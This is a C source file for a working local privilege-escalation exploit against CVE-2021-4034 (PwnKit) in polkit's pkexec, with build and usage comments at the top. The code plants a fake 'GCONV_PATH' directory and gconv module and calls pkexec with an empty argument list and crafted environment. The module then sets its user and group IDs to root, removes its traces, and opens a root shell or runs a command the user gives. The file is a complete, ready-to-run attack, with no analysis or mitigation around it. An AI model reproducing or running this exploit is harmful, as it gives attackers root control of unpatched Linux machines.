// gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
// CVE-2021-4034 (PwnKit) launcher: ./PwnKit '<command>'
#define _XOPEN_SOURCE 700
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <ftw.h>
#include <limits.h>

#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/signal.h>

#ifdef __amd64__
const char service_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";
#endif

int unlink_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf)
{
    int rv = remove(fpath);
    return rv;
}

int rmrf(char *path)
{
    return nftw(path, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
}

void entry()
{
    int res;
    FILE *fp;
    char buf[PATH_MAX];
    int pipefd[2];
    char *cmd;
    int argc;
    char **argv;
    register unsigned long *rbp asm ("rbp");

    argc = *(int *)(rbp+1);
    argv = (char **)rbp+2;

    res = mkdir("GCONV_PATH=.", 0777);
    if (res == -1 && errno != EEXIST) { _exit(1); }

    creat("GCONV_PATH=./.pkexec", 0777);
    mkdir(".pkexec", 0777);

    fp = fopen(".pkexec/gconv-modules", "w+");
    if (fp == NULL) { _exit(1); }
    fputs("module UTF-8// PKEXEC// pkexec 2", fp);
    fclose(fp);

    buf[readlink("/proc/self/exe", buf, sizeof(buf)-1)] = 0;
    symlink(buf, ".pkexec/pkexec.so");

    pipe(pipefd);
    if (fork() == 0)
    {
        close(pipefd[1]);
        buf[read(pipefd[0], buf, sizeof(buf)-1)] = 0;
        if (strstr(buf, "pkexec --version") == buf) {
            puts("Exploit failed. Target is most likely patched.");
            rmrf("GCONV_PATH=.");
            rmrf(".pkexec");
        }
        _exit(0);
    }

    close(pipefd[0]);
    dup2(pipefd[1], 2);
    close(pipefd[1]);

    cmd = NULL;
    if (argc > 1) {
        cmd = memcpy(argv[1]-4, "CMD=", 4);
    }
    char *args[] = {NULL};
    char *env[] = {".pkexec", "PATH=GCONV_PATH=.", "CHARSET=pkexec", "SHELL=pkexec", cmd, NULL};
    execve("/usr/bin/pkexec", args, env);
    execvpe("pkexec", args, env);
    _exit(0);
}

void gconv() {}
void gconv_init()
{
    close(2);
    dup2(1, 2);

    char *cmd = getenv("CMD");

    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    rmrf("GCONV_PATH=.");
    rmrf(".pkexec");

    if (cmd) {
        execve("/bin/sh", (char *[]){"/bin/sh", "-c", cmd, NULL}, NULL);
    } else {
        execve("/bin/bash", (char *[]){"-i", NULL}, NULL);
        execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
    }
    _exit(0);
}
